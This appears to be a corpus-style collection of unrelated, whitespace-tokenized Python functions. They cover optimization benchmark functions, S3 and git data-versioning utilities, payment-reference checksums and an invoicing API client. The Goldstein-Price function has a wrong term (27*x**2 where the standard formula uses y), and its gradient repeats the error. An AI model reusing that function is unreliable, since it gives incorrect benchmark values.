def dixon_price ( theta ) : x , y = theta obj = ( x - 1 ) ** 2 + 2 * ( 2 * y ** 2 - x ) ** 2 grad = np . array ( [ 2 * x - 2 - 4 * ( 2 * y ** 2 - x ) , 16 * ( 2 * y ** 2 - x ) * y , ] ) return obj , grad
def goldstein_price ( theta ) : x , y = theta obj = ( 1 + ( x + y + 1 ) ** 2 * ( 19 - 14 * x + 3 * x ** 2 - 14 * y + 6 * x * y + 3 * y ** 2 ) ) * ( 30 + ( 2 * x - 3 * y ) ** 2 * ( 18 - 32 * x + 12 * x ** 2 + 48 * y - 36 * x * y + 27 * x ** 2 ) ) grad = np . array ( [ ( ( 2 * x - 3 * y ) ** 2 * ( 78 * x - 36 * y - 32 ) + ( 8 * x - 12 * y ) * ( 39 * x ** 2 - 36 * x * y - 32 * x + 48 * y + 18 ) ) * ( ( x + y + 1 ) ** 2 * ( 3 * x ** 2 + 6 * x * y - 14 * x + 3 * y ** 2 - 14 * y + 19 ) + 1 ) + ( ( 2 * x - 3 * y ) ** 2 * ( 39 * x ** 2 - 36 * x * y - 32 * x + 48 * y + 18 ) + 30 ) * ( ( x + y + 1 ) ** 2 * ( 6 * x + 6 * y - 14 ) + ( 2 * x + 2 * y + 2 ) * ( 3 * x ** 2 + 6 * x * y - 14 * x + 3 * y ** 2 - 14 * y + 19 ) ) , ( ( - 36 * x + 48 ) * ( 2 * x - 3 * y ) ** 2 + ( - 12 * x + 18 * y ) * ( 39 * x ** 2 - 36 * x * y - 32 * x + 48 * y + 18 ) ) * ( ( x + y + 1 ) ** 2 * ( 3 * x ** 2 + 6 * x * y - 14 * x + 3 * y ** 2 - 14 * y + 19 ) + 1 ) + ( ( 2 * x - 3 * y ) ** 2 * ( 39 * x ** 2 - 36 * x * y - 32 * x + 48 * y + 18 ) + 30 ) * ( ( x + y + 1 ) ** 2 * ( 6 * x + 6 * y - 14 ) + ( 2 * x + 2 * y + 2 ) * ( 3 * x ** 2 + 6 * x * y - 14 * x + 3 * y ** 2 - 14 * y + 19 ) ) , ] ) return obj , grad
def styblinski_tang ( theta ) : x , y = theta obj = 0.5 * ( x ** 4 - 16 * x ** 2 + 5 * x + y ** 4 - 16 * y ** 2 + 5 * y ) grad = np . array ( [ 2 * x ** 3 - 16 * x + 2.5 , 2 * y ** 3 - 16 * y + 2.5 , ] ) return obj , grad
def create_bucket ( self , * args , * * kwargs ) : bucket = super ( S3Connection , self ) . create_bucket ( * args , * * kwargs ) if bucket : mimicdb . backend . sadd ( tpl . connection , bucket . name ) return bucket
def delete_keys ( self , * args , * * kwargs ) : ikeys = iter ( kwargs . get ( 'keys' , args [ 0 ] if args else [ ] ) ) while True : try : key = ikeys . next ( ) except StopIteration : break if isinstance ( key , basestring ) : mimicdb . backend . srem ( tpl . bucket % self . name , key ) mimicdb . backend . delete ( tpl . key % ( self . name , key ) ) elif isinstance ( key , BotoKey ) or isinstance ( key , Key ) : mimicdb . backend . srem ( tpl . bucket % self . name , key . name ) mimicdb . backend . delete ( tpl . key % ( self . name , key . name ) ) return super ( Bucket , self ) . delete_keys ( * args , * * kwargs )
def _delete_key_internal ( self , * args , * * kwargs ) : mimicdb . backend . srem ( tpl . bucket % self . name , args [ 0 ] ) mimicdb . backend . delete ( tpl . key % ( self . name , args [ 0 ] ) ) return super ( Bucket , self ) . _delete_key_internal ( * args , * * kwargs )
def sdcone ( x , rho ) : U , V = np . linalg . eigh ( x ) return V . dot ( np . diag ( np . maximum ( U , 0 ) ) . dot ( V . T ) )
def columns ( x , rho , proxop ) : xnext = np . zeros_like ( x ) for ix in range ( x . shape [ 1 ] ) : xnext [ : , ix ] = proxop ( x [ : , ix ] , rho ) return xnext
def gradient_optimizer ( coro ) : class GradientOptimizer ( Optimizer ) : @ wraps ( coro ) def __init__ ( self , * args , * * kwargs ) : self . algorithm = coro ( * args , * * kwargs ) self . algorithm . send ( None ) self . operators = [ ] def set_transform ( self , func ) : self . transform = compose ( destruct , func , self . restruct ) def minimize ( self , f_df , x0 , display = sys . stdout , maxiter = 1e3 ) : self . display = display self . theta = x0 # setup xk = self . algorithm . send ( destruct ( x0 ) . copy ( ) ) store = defaultdict ( list ) runtimes = [ ] if len ( self . operators ) == 0 : self . operators = [ proxops . identity ( ) ] # setup obj , grad = wrap ( f_df , x0 ) transform = compose ( destruct , * reversed ( self . operators ) , self . restruct ) self . optional_print ( tp . header ( [ 'Iteration' , 'Objective' , '||Grad||' , 'Runtime' ] ) ) try : for k in count ( ) : # setup tstart = perf_counter ( ) f = obj ( xk ) df = grad ( xk ) xk = transform ( self . algorithm . send ( df ) ) runtimes . append ( perf_counter ( ) - tstart ) store [ 'f' ] . append ( f ) # Update display self . optional_print ( tp . row ( [ k , f , np . linalg . norm ( destruct ( df ) ) , tp . humantime ( runtimes [ - 1 ] ) ] ) ) if k >= maxiter : break except KeyboardInterrupt : pass self . optional_print ( tp . bottom ( 4 ) ) # cleanup self . optional_print ( u'\u279b Final objective: {}' . format ( store [ 'f' ] [ - 1 ] ) ) self . optional_print ( u'\u279b Total runtime: {}' . format ( tp . humantime ( sum ( runtimes ) ) ) ) self . optional_print ( u'\u279b Per iteration runtime: {} +/- {}' . format ( tp . humantime ( np . mean ( runtimes ) ) , tp . humantime ( np . std ( runtimes ) ) , ) ) # result return OptimizeResult ( { 'x' : self . restruct ( xk ) , 'f' : f , 'df' : self . restruct ( df ) , 'k' : k , 'obj' : np . array ( store [ 'f' ] ) , } ) return GradientOptimizer
def add ( self , operator , * args ) : if isinstance ( operator , str ) : op = getattr ( proxops , operator ) ( * args ) elif isinstance ( operator , proxops . ProximalOperatorBaseClass ) : op = operator else : raise ValueError ( "operator must be a string or a subclass of ProximalOperator" ) self . operators . append ( op ) return self
def evaluate ( self , repo , spec , args ) : status = [ ] # Do we have to any thing at all?  if len ( spec [ 'files' ] ) == 0 : return status with cd ( repo . rootdir ) : rules = None if 'rules-files' in spec and len ( spec [ 'rules-files' ] ) > 0 : rulesfiles = spec [ 'rules-files' ] rules = { } for f in rulesfiles : d = json . loads ( open ( f ) . read ( ) ) rules . update ( d ) elif 'rules' in spec : rules = { 'inline' : spec [ 'rules' ] } if rules is None or len ( rules ) == 0 : print ( "Regression quality validation has been enabled but no rules file has been specified" ) print ( "Example: { 'min-r2': 0.25 }. Put this either in file or in dgit.json" ) raise InvalidParameters ( "Regression quality checking rules missing" ) files = dict ( [ ( f , open ( f ) . read ( ) ) for f in spec [ 'files' ] ] ) for r in rules : if 'min-r2' not in rules [ r ] : continue minr2 = float ( rules [ r ] [ 'min-r2' ] ) for f in files : match = re . search ( r"R-squared:\s+(\d.\d+)" , files [ f ] ) if match is None : status . append ( { 'target' : f , 'validator' : self . name , 'description' : self . description , 'rules' : r , 'status' : "ERROR" , 'message' : "Invalid model output" } ) else : r2 = match . group ( 1 ) r2 = float ( r2 ) if r2 > minr2 : status . append ( { 'target' : f , 'validator' : self . name , 'description' : self . description , 'rules' : r , 'status' : "OK" , 'message' : "Acceptable R2" } ) else : status . append ( { 'target' : f , 'validator' : self . name , 'description' : self . description , 'rules' : r , 'status' : "ERROR" , 'message' : "R2 is too low" } ) return status
def evaluate ( self , repo , spec , args ) : status = [ ] with cd ( repo . rootdir ) : files = spec . get ( 'files' , [ '*' ] ) resource_files = repo . find_matching_files ( files ) files = glob2 . glob ( "**/*" ) disk_files = [ f for f in files if os . path . isfile ( f ) and f != "datapackage.json" ] allfiles = list ( set ( resource_files + disk_files ) ) allfiles . sort ( ) for f in allfiles : if f in resource_files and f in disk_files : r = repo . get_resource ( f ) coded_sha256 = r [ 'sha256' ] computed_sha256 = compute_sha256 ( f ) if computed_sha256 != coded_sha256 : status . append ( { 'target' : f , 'rules' : "" , 'validator' : self . name , 'description' : self . description , 'status' : 'ERROR' , 'message' : "Mismatch in checksum on disk and in datapackage.json" } ) else : status . append ( { 'target' : f , 'rules' : "" , 'validator' : self . name , 'description' : self . description , 'status' : 'OK' , 'message' : "" } ) elif f in resource_files : status . append ( { 'target' : f , 'rules' : "" , 'validator' : self . name , 'description' : self . description , 'status' : 'ERROR' , 'message' : "In datapackage.json but not in repo" } ) else : status . append ( { 'target' : f , 'rules' : "" , 'validator' : self . name , 'description' : self . description , 'status' : 'ERROR' , 'message' : "In repo but not in datapackage.json" } ) return status
def read_file ( self , filename ) : #print("Reading file", filename) try : fh = open ( filename , 'rb' ) table_set = any_tableset ( fh ) # guess the type... except : #traceback.print_exc() # Cannot find the schema. table_set = None return table_set
def get_schema ( self , filename ) : table_set = self . read_file ( filename ) # Have I been able to read the filename if table_set is None : return [ ] # Get the first table as rowset row_set = table_set . tables [ 0 ] offset , headers = headers_guess ( row_set . sample ) row_set . register_processor ( headers_processor ( headers ) ) row_set . register_processor ( offset_processor ( offset + 1 ) ) types = type_guess ( row_set . sample , strict = True ) # Get a sample as well.. sample = next ( row_set . sample ) clean = lambda v : str ( v ) if not isinstance ( v , str ) else v schema = [ ] for i , h in enumerate ( headers ) : schema . append ( [ h , str ( types [ i ] ) , clean ( sample [ i ] . value ) ] ) return schema
def int2fin_reference ( n ) : checksum = 10 - ( sum ( [ int ( c ) * i for c , i in zip ( str ( n ) [ : : - 1 ] , it . cycle ( ( 7 , 3 , 1 ) ) ) ] ) % 10 ) if checksum == 10 : checksum = 0 return "%s%s" % ( n , checksum )
def iso_reference_valid_char ( c , raise_error = True ) : if c in ISO_REFERENCE_VALID : return True if raise_error : raise ValueError ( "'%s' is not in '%s'" % ( c , ISO_REFERENCE_VALID ) ) return False
def iso_reference_str2int ( n ) : n = n . upper ( ) numbers = [ ] for c in n : iso_reference_valid_char ( c ) if c in ISO_REFERENCE_VALID_NUMERIC : numbers . append ( c ) else : numbers . append ( str ( iso_reference_char2int ( c ) ) ) return int ( '' . join ( numbers ) )
def iso_reference_isvalid ( ref ) : ref = str ( ref ) cs_source = ref [ 4 : ] + ref [ : 4 ] return ( iso_reference_str2int ( cs_source ) % 97 ) == 1
def add_file_normal ( f , targetdir , generator , script , source ) : basename = os . path . basename ( f ) if targetdir != "." : relativepath = os . path . join ( targetdir , basename ) else : relativepath = basename relpath = os . path . relpath ( f , os . getcwd ( ) ) filetype = 'data' if script : filetype = 'script' if generator : filetype = 'generator' update = OrderedDict ( [ ( 'type' , filetype ) , ( 'generator' , generator ) , ( 'relativepath' , relativepath ) , ( 'content' , "" ) , ( 'source' , source ) , ( 'localfullpath' , f ) , ( 'localrelativepath' , relpath ) ] ) update = annotate_record ( update ) return ( basename , update )
def extract_files ( filename , includes ) : # Load the execution strace log lines = open ( filename ) . readlines ( ) # Extract only open files - whether for read or write. You often # want to capture the json/ini configuration file as well files = { } lines = [ l . strip ( ) for l in lines if 'open(' in l ] for l in lines : # Check both these formats... # 20826 open("/usr/lib/locale/locale-archive", O_RDONLY|O_CLOEXEC) = 3 #[28940] access(b'/etc/ld.so.nohwcap', F_OK)      = -2 (No such file or directory) matchedfile = re . search ( 'open\([b]["\'](.+?)["\']' , l ) if matchedfile is None : matchedfile = re . search ( 'open\("(.+?)\"' , l ) if matchedfile is None : continue matchedfile = matchedfile . group ( 1 ) if os . path . exists ( matchedfile ) and os . path . isfile ( matchedfile ) : #print("Looking at ", matchedfile) # Check what action is being performed on these action = 'input' if 'O_RDONLY' in l else 'output' matchedfile = os . path . relpath ( matchedfile , "." ) #print("Matched file's relative path", matchedfile) for i in includes : if fnmatch . fnmatch ( matchedfile , i ) : # Exclude python libraries if 'site-packages' in matchedfile : continue if matchedfile not in files : files [ matchedfile ] = [ action ] else : if action not in files [ matchedfile ] : files [ matchedfile ] . append ( action ) # A single file may be opened and closed multiple times if len ( files ) == 0 : print ( "No input or output files found that match pattern" ) return [ ] print ( 'We captured files that matched the pattern you specified.' ) print ( 'Please select files to keep (press ENTER)' ) # Let the user have the final say on which files must be included. filenames = list ( files . keys ( ) ) filenames . sort ( ) with tempfile . NamedTemporaryFile ( suffix = ".tmp" ) as temp : temp . write ( yaml . dump ( filenames , default_flow_style = False ) . encode ( 'utf-8' ) ) temp . flush ( ) EDITOR = os . environ . get ( 'EDITOR' , '/usr/bin/vi' ) subprocess . call ( "%s %s" % ( EDITOR , temp . name ) , shell = True ) temp . seek ( 0 ) data = temp . read ( ) selected = yaml . load ( data ) print ( "You selected" , len ( selected ) , "file(s)" ) if len ( selected ) == 0 : return [ ] # Get the action corresponding to the selected files filenames = [ f for f in filenames if f in selected ] # Now we know the list of files. Where should they go? print ( 'Please select target locations for the various directories we found' ) print ( 'Please make sure you do not delete any rows or edit the keys.' ) input ( '(press ENTER)' ) prefixes = { } for f in filenames : dirname = os . path . dirname ( f ) if dirname == "" : dirname = "." prefixes [ dirname ] = dirname while True : with tempfile . NamedTemporaryFile ( suffix = ".tmp" ) as temp : temp . write ( yaml . dump ( prefixes , default_flow_style = False ) . encode ( 'utf-8' ) ) temp . flush ( ) EDITOR = os . environ . get ( 'EDITOR' , '/usr/bin/vi' ) subprocess . call ( "%s %s" % ( EDITOR , temp . name ) , shell = True ) temp . seek ( 0 ) data = temp . read ( ) try : revised = yaml . load ( data ) except Exception as e : revised = { } #print(list(revised.keys())) #print(list(prefixes.keys())) if set ( list ( revised . keys ( ) ) ) == set ( list ( prefixes . keys ( ) ) ) : prefixes = revised break else : print ( "Could not process edited file. Either some rows are missing or entry has YAML syntax errors" ) input ( "Press ENTER to continue" ) # Add the root directory back if "." in prefixes : prefixes [ "" ] = prefixes [ "." ] result = [ ] ts = datetime . now ( ) . isoformat ( ) for f in filenames : relativepath = prefixes [ os . path . dirname ( f ) ] if relativepath == "." : relativepath = os . path . basename ( f ) else : relativepath = os . path . join ( relativepath , os . path . basename ( f ) ) result . append ( OrderedDict ( [ ( 'relativepath' , relativepath ) , ( 'type' , 'run-output' ) , ( 'actions' , files [ f ] ) , ( 'mimetypes' , mimetypes . guess_type ( f ) [ 0 ] ) , ( 'content' , open ( f ) . read ( 512 ) ) , ( 'sha256' , compute_sha256 ( f ) ) , ( 'ts' , ts ) , ( 'localrelativepath' , os . path . relpath ( f , "." ) ) , ( 'localfullpath' , os . path . abspath ( f ) ) , ] ) ) print ( json . dumps ( result , indent = 4 ) ) return result
def run_executable ( repo , args , includes ) : # Get platform information mgr = plugins_get_mgr ( ) repomgr = mgr . get ( what = 'instrumentation' , name = 'platform' ) platform_metadata = repomgr . get_metadata ( ) print ( "Obtaining Commit Information" ) ( executable , commiturl ) = find_executable_commitpath ( repo , args ) # Create a local directory tmpdir = tempfile . mkdtemp ( ) # Construct the strace command print ( "Running the command" ) strace_filename = os . path . join ( tmpdir , 'strace.out.txt' ) cmd = [ "strace.py" , "-f" , "-o" , strace_filename , "-s" , "1024" , "-q" , "--" ] + args # Run the command p = subprocess . Popen ( cmd , stdout = subprocess . PIPE , stderr = subprocess . PIPE ) out , err = p . communicate ( ) # Capture the stdout/stderr stdout = os . path . join ( tmpdir , 'stdout.log.txt' ) with open ( stdout , 'w' ) as fd : fd . write ( out . decode ( 'utf-8' ) ) stderr = os . path . join ( tmpdir , 'stderr.log.txt' ) with open ( stderr , 'w' ) as fd : fd . write ( err . decode ( 'utf-8' ) ) # Check the strace output files = extract_files ( strace_filename , includes ) # Now insert the execution metadata execution_metadata = { 'likelyexecutable' : executable , 'commitpath' : commiturl , 'args' : args , } execution_metadata . update ( platform_metadata ) for i in range ( len ( files ) ) : files [ i ] [ 'execution_metadata' ] = execution_metadata return files
def find_matching_files ( self , includes ) : if len ( includes ) == 0 : return [ ] files = [ f [ 'relativepath' ] for f in self . package [ 'resources' ] ] includes = r'|' . join ( [ fnmatch . translate ( x ) for x in includes ] ) # Match both the file name as well the path.. files = [ f for f in files if re . match ( includes , os . path . basename ( f ) ) ] + [ f for f in files if re . match ( includes , f ) ] files = list ( set ( files ) ) return files
def run ( self , cmd , * args ) : if self . manager is None : raise Exception ( "Fatal internal error: Missing repository manager" ) if cmd not in dir ( self . manager ) : raise Exception ( "Fatal internal error: Invalid command {} being run" . format ( cmd ) ) func = getattr ( self . manager , cmd ) repo = self return func ( repo , * args )
def get_resource ( self , p ) : for r in self . package [ 'resources' ] : if r [ 'relativepath' ] == p : r [ 'localfullpath' ] = os . path . join ( self . rootdir , p ) return r raise Exception ( "Invalid path" )
def lookup ( self , username = None , reponame = None , key = None ) : if key is None : key = self . key ( username , reponame ) if key not in self . repos : raise UnknownRepository ( ) return self . repos [ key ]
def rootdir ( self , username , reponame , create = True ) : path = os . path . join ( self . workspace , 'datasets' , username , reponame ) if create : try : os . makedirs ( path ) except : pass return path
def add ( self , repo ) : key = self . key ( repo . username , repo . reponame ) repo . key = key self . repos [ key ] = repo return key
def lookup ( username , reponame ) : mgr = plugins_get_mgr ( ) # XXX This should be generalized to all repo managers. repomgr = mgr . get ( what = 'repomanager' , name = 'git' ) repo = repomgr . lookup ( username = username , reponame = reponame ) return repo
def datapackage_exists ( repo ) : datapath = os . path . join ( repo . rootdir , "datapackage.json" ) return os . path . exists ( datapath )
def bootstrap_datapackage ( repo , force = False , options = None , noinput = False ) : print ( "Bootstrapping datapackage" ) # get the directory tsprefix = datetime . now ( ) . date ( ) . isoformat ( ) # Initial data package json package = OrderedDict ( [ ( 'title' , '' ) , ( 'description' , '' ) , ( 'username' , repo . username ) , ( 'reponame' , repo . reponame ) , ( 'name' , str ( repo ) ) , ( 'title' , "" ) , ( 'description' , "" ) , ( 'keywords' , [ ] ) , ( 'resources' , [ ] ) , ( 'creator' , getpass . getuser ( ) ) , ( 'createdat' , datetime . now ( ) . isoformat ( ) ) , ( 'remote-url' , repo . remoteurl ) ] ) if options is not None : package [ 'title' ] = options [ 'title' ] package [ 'description' ] = options [ 'description' ] else : if noinput : raise IncompleteParameters ( "Option field with title and description" ) for var in [ 'title' , 'description' ] : value = '' while value in [ '' , None ] : value = input ( 'Your Repo ' + var . title ( ) + ": " ) if len ( value ) == 0 : print ( "{} cannot be empty. Please re-enter." . format ( var . title ( ) ) ) package [ var ] = value # Now store the package... ( handle , filename ) = tempfile . mkstemp ( ) with open ( filename , 'w' ) as fd : fd . write ( json . dumps ( package , indent = 4 ) ) repo . package = package return filename
def annotate_metadata_data ( repo , task , patterns = [ "*" ] , size = 0 ) : mgr = plugins_get_mgr ( ) keys = mgr . search ( 'representation' ) [ 'representation' ] representations = [ mgr . get_by_key ( 'representation' , k ) for k in keys ] matching_files = repo . find_matching_files ( patterns ) package = repo . package rootdir = repo . rootdir files = package [ 'resources' ] for f in files : relativepath = f [ 'relativepath' ] if relativepath in matching_files : path = os . path . join ( rootdir , relativepath ) if task == 'preview' : print ( "Adding preview for " , relativepath ) f [ 'content' ] = open ( path ) . read ( ) [ : size ] elif task == 'schema' : for r in representations : if r . can_process ( path ) : print ( "Adding schema for " , path ) f [ 'schema' ] = r . get_schema ( path ) break
def annotate_metadata_code ( repo , files ) : package = repo . package package [ 'code' ] = [ ] for p in files : matching_files = glob2 . glob ( "**/{}" . format ( p ) ) for f in matching_files : absf = os . path . abspath ( f ) print ( "Add commit data for {}" . format ( f ) ) package [ 'code' ] . append ( OrderedDict ( [ ( 'script' , f ) , ( 'permalink' , repo . manager . permalink ( repo , absf ) ) , ( 'mimetypes' , mimetypes . guess_type ( absf ) [ 0 ] ) , ( 'sha256' , compute_sha256 ( absf ) ) ] ) )
def annotate_metadata_action ( repo ) : package = repo . package print ( "Including history of actions" ) with cd ( repo . rootdir ) : filename = ".dgit/log.json" if os . path . exists ( filename ) : history = open ( filename ) . readlines ( ) actions = [ ] for a in history : try : a = json . loads ( a ) for x in [ 'code' ] : if x not in a or a [ x ] == None : a [ x ] = "..." actions . append ( a ) except : pass package [ 'actions' ] = actions
def annotate_metadata_platform ( repo ) : print ( "Added platform information" ) package = repo . package mgr = plugins_get_mgr ( ) repomgr = mgr . get ( what = 'instrumentation' , name = 'platform' ) package [ 'platform' ] = repomgr . get_metadata ( )
def annotate_metadata_dependencies ( repo ) : options = repo . options if 'dependencies' not in options : print ( "No dependencies" ) return [ ] repos = [ ] dependent_repos = options [ 'dependencies' ] for d in dependent_repos : if "/" not in d : print ( "Invalid dependency specification" ) ( username , reponame ) = d . split ( "/" ) try : repos . append ( repo . manager . lookup ( username , reponame ) ) except : print ( "Repository does not exist. Please create one" , d ) package = repo . package package [ 'dependencies' ] = [ ] for r in repos : package [ 'dependencies' ] . append ( { 'username' : r . username , 'reponame' : r . reponame , } )
def discover_all_plugins ( self ) : for v in pkg_resources . iter_entry_points ( 'dgit.plugins' ) : m = v . load ( ) m . setup ( self )
def search ( self , what , name = None , version = None ) : filtered = { } # The search may for a scan (what is None) or if what is None : whats = list ( self . plugins . keys ( ) ) elif what is not None : if what not in self . plugins : raise Exception ( "Unknown class of plugins" ) whats = [ what ] for what in whats : if what not in filtered : filtered [ what ] = [ ] for key in self . plugins [ what ] . keys ( ) : ( k_name , k_version ) = key if name is not None and k_name != name : continue if version is not None and k_version != version : continue if self . plugins [ what ] [ key ] . enable == 'n' : continue filtered [ what ] . append ( key ) # print(filtered) return filtered
def gather_configs ( self ) : configs = [ ] for what in self . order : for key in self . plugins [ what ] : mgr = self . plugins [ what ] [ key ] c = mgr . config ( what = 'get' ) if c is not None : c . update ( { 'description' : mgr . description } ) # print("Gathering configuration from ", c) configs . append ( c ) return configs
def update_configs ( self , config ) : for what in self . plugins : # backend, repo etc. for key in self . plugins [ what ] : # s3, filesystem etc. # print("Updating configuration of", what, key) self . plugins [ what ] [ key ] . config ( what = 'set' , params = config ) return
def instantiate ( repo , validator_name = None , filename = None , rulesfiles = None ) : default_validators = repo . options . get ( 'validator' , { } ) validators = { } if validator_name is not None : # Handle the case validator is specified.. if validator_name in default_validators : validators = { validator_name : default_validators [ validator_name ] } else : validators = { validator_name : { 'files' : [ ] , 'rules' : { } , 'rules-files' : [ ] } } else : validators = default_validators #========================================= # Insert the file names #========================================= if filename is not None : matching_files = repo . find_matching_files ( [ filename ] ) if len ( matching_files ) == 0 : print ( "Filename could not be found" , filename ) raise Exception ( "Invalid filename pattern" ) for v in validators : validators [ v ] [ 'files' ] = matching_files else : # Instantiate the files from the patterns specified for v in validators : if 'files' not in validators [ v ] : validators [ v ] [ 'files' ] = [ ] elif len ( validators [ v ] [ 'files' ] ) > 0 : matching_files = repo . find_matching_files ( validators [ v ] [ 'files' ] ) validators [ v ] [ 'files' ] = matching_files #========================================= # Insert the rules files.. #========================================= if rulesfiles is not None : # Command lines... matching_files = repo . find_matching_files ( [ rulesfiles ] ) if len ( matching_files ) == 0 : print ( "Could not find matching rules files ({}) for {}" . format ( rulesfiles , v ) ) raise Exception ( "Invalid rules" ) for v in validators : validators [ v ] [ 'rules-files' ] = matching_files else : # Instantiate the files from the patterns specified for v in validators : if 'rules-files' not in validators [ v ] : validators [ v ] [ 'rules-files' ] = [ ] else : rulesfiles = validators [ v ] [ 'rules-files' ] matching_files = repo . find_matching_files ( rulesfiles ) validators [ v ] [ 'rules-files' ] = matching_files return validators
def url_is_valid ( self , url ) : # Check if the file system path exists... if url . startswith ( "file://" ) : url = url . replace ( "file://" , "" ) return os . path . exists ( url )
def find_executable_files ( ) : files = glob . glob ( "*" ) + glob . glob ( "*/*" ) + glob . glob ( '*/*/*' ) files = filter ( lambda f : os . path . isfile ( f ) , files ) executable = stat . S_IEXEC | stat . S_IXGRP | stat . S_IXOTH final = [ ] for filename in files : if os . path . isfile ( filename ) : st = os . stat ( filename ) mode = st . st_mode if mode & executable : final . append ( filename ) if len ( final ) > 5 : break return final
def get_files_to_commit ( autooptions ) : workingdir = autooptions [ 'working-directory' ] includes = autooptions [ 'track' ] [ 'includes' ] excludes = autooptions [ 'track' ] [ 'excludes' ] # transform glob patterns to regular expressions # print("Includes ", includes)  includes = r'|' . join ( [ fnmatch . translate ( x ) for x in includes ] ) excludes = r'|' . join ( [ fnmatch . translate ( x ) for x in excludes ] ) or r'$.' matched_files = [ ] for root , dirs , files in os . walk ( workingdir ) : # print("Looking at ", files) # exclude dirs # dirs[:] = [os.path.join(root, d) for d in dirs] dirs [ : ] = [ d for d in dirs if not re . match ( excludes , d ) ] # exclude/include files files = [ f for f in files if not re . match ( excludes , f ) ] #print("Files after excludes", files) #print(includes)  files = [ f for f in files if re . match ( includes , f ) ] #print("Files after includes", files)  files = [ os . path . join ( root , f ) for f in files ] matched_files . extend ( files ) return matched_files
def auto_add ( repo , autooptions , files ) : # Get the mappings and keys. mapping = { "." : "" } if ( ( 'import' in autooptions ) and ( 'directory-mapping' in autooptions [ 'import' ] ) ) : mapping = autooptions [ 'import' ] [ 'directory-mapping' ] # Apply the longest prefix first... keys = mapping . keys ( ) keys = sorted ( keys , key = lambda k : len ( k ) , reverse = True ) count = 0 params = [ ] for f in files : # Find the destination relativepath = f for k in keys : v = mapping [ k ] if f . startswith ( k + "/" ) : #print("Replacing ", k) relativepath = f . replace ( k + "/" , v ) break # Now add to repository count += files_add ( repo = repo , args = [ f ] , targetdir = os . path . dirname ( relativepath ) ) return count
def instantiate ( repo , name = None , filename = None ) : default_transformers = repo . options . get ( 'transformer' , { } ) # If a name is specified, then lookup the options from dgit.json # if specfied. Otherwise it is initialized to an empty list of # files. transformers = { } if name is not None : # Handle the case generator is specified.. if name in default_transformers : transformers = { name : default_transformers [ name ] } else : transformers = { name : { 'files' : [ ] , } } else : transformers = default_transformers #========================================= # Map the filename patterns to list of files #========================================= # Instantiate the files from the patterns specified input_matching_files = None if filename is not None : input_matching_files = repo . find_matching_files ( [ filename ] ) for t in transformers : for k in transformers [ t ] : if "files" not in k : continue if k == "files" and input_matching_files is not None : # Use the files specified on the command line.. transformers [ t ] [ k ] = input_matching_files else : # Try to match the specification if transformers [ t ] [ k ] is None or len ( transformers [ t ] [ k ] ) == 0 : transformers [ t ] [ k ] = [ ] else : matching_files = repo . find_matching_files ( transformers [ t ] [ k ] ) transformers [ t ] [ k ] = matching_files return transformers
def delete ( self , repo , args = [ ] ) : result = None with cd ( repo . rootdir ) : try : cmd = [ 'rm' ] + list ( args ) result = { 'status' : 'success' , 'message' : self . _run ( cmd ) } except Exception as e : result = { 'status' : 'error' , 'message' : str ( e ) } # print(result) return result
def permalink ( self , repo , path ) : if not os . path . exists ( path ) : # print("Path does not exist", path) return ( None , None ) # Get this directory cwd = os . getcwd ( ) # Find the root of the repo and cd into that directory.. if os . path . isfile ( path ) : os . chdir ( os . path . dirname ( path ) ) rootdir = self . _run ( [ "rev-parse" , "--show-toplevel" ] ) if "fatal" in rootdir : # print("fatal", rootdir) return ( None , None ) os . chdir ( rootdir ) # print("Rootdir = ", rootdir) # Now find relative path relpath = os . path . relpath ( path , rootdir ) # print("relpath = ", relpath) # Get the last commit for this file #3764cc2600b221ac7d7497de3d0dbcb4cffa2914 sha1 = self . _run ( [ "log" , "-n" , "1" , "--format=format:%H" , relpath ] ) # print("sha1 = ", sha1) # Get the repo URL #git@gitlab.com:pingali/simple-regression.git #https://gitlab.com/kanban_demo/test_project.git remoteurl = self . _run ( [ "config" , "--get" , "remote.origin.url" ] ) # print("remoteurl = ", remoteurl) # Go back to the original directory... os . chdir ( cwd ) # Now match it against two possible formats of the remote url # Examples #https://help.github.com/articles/getting-permanent-links-to-files/ #https://gitlab.com/pingali/simple-regression/blob/3764cc2600b221ac7d7497de3d0dbcb4cffa2914/model.py #https://gitlab.com/kanban_demo/test_project/blob/b004677c23b3a31eb7b5588a5194857b2c8b2b95/README.md m = re . search ( '^git@([^:\/]+):([^/]+)/([^/]+)' , remoteurl ) if m is None : m = re . search ( '^https://([^:/]+)/([^/]+)/([^/]+)' , remoteurl ) if m is not None : domain = m . group ( 1 ) username = m . group ( 2 ) project = m . group ( 3 ) if project . endswith ( ".git" ) : project = project [ : - 4 ] permalink = "https://{}/{}/{}/blob/{}/{}" . format ( domain , username , project , sha1 , relpath ) # print("permalink = ", permalink) return ( relpath , permalink ) else : return ( None , None )
def add_files ( self , repo , files ) : rootdir = repo . rootdir for f in files : relativepath = f [ 'relativepath' ] sourcepath = f [ 'localfullpath' ] if sourcepath is None : # This can happen if the relative path is a URL continue # # Prepare the target path targetpath = os . path . join ( rootdir , relativepath ) try : os . makedirs ( os . path . dirname ( targetpath ) ) except : pass # print(sourcepath," => ", targetpath) print ( "Updating: {}" . format ( relativepath ) ) shutil . copyfile ( sourcepath , targetpath ) with cd ( repo . rootdir ) : self . _run ( [ 'add' , relativepath ] )
def to_holvi_dict ( self ) : self . _jsondata [ "items" ] = [ ] for item in self . items : self . _jsondata [ "items" ] . append ( item . to_holvi_dict ( ) ) self . _jsondata [ "issue_date" ] = self . issue_date . isoformat ( ) self . _jsondata [ "due_date" ] = self . due_date . isoformat ( ) self . _jsondata [ "receiver" ] = self . receiver . to_holvi_dict ( ) return { k : v for ( k , v ) in self . _jsondata . items ( ) if k in self . _valid_keys }
def save ( self ) : if self . code : raise HolviError ( "Orders cannot be updated" ) send_json = self . to_holvi_dict ( ) send_json . update ( { 'pool' : self . api . connection . pool } ) url = six . u ( self . api . base_url + "order/" ) stat = self . api . connection . make_post ( url , send_json ) code = stat [ "details_uri" ] . split ( "/" ) [ - 2 ] # Maybe slightly ugly but I don't want to basically reimplement all but uri formation of the api method return ( stat [ "checkout_uri" ] , self . api . get_order ( code ) )
def init_repo ( self , gitdir ) : hooksdir = os . path . join ( gitdir , 'hooks' ) content = postreceive_template % { 'client' : self . client , 'bucket' : self . bucket , 's3cfg' : self . s3cfg , 'prefix' : self . prefix } postrecv_filename = os . path . join ( hooksdir , 'post-receive' ) with open ( postrecv_filename , 'w' ) as fd : fd . write ( content ) self . make_hook_executable ( postrecv_filename ) print ( "Wrote to" , postrecv_filename )
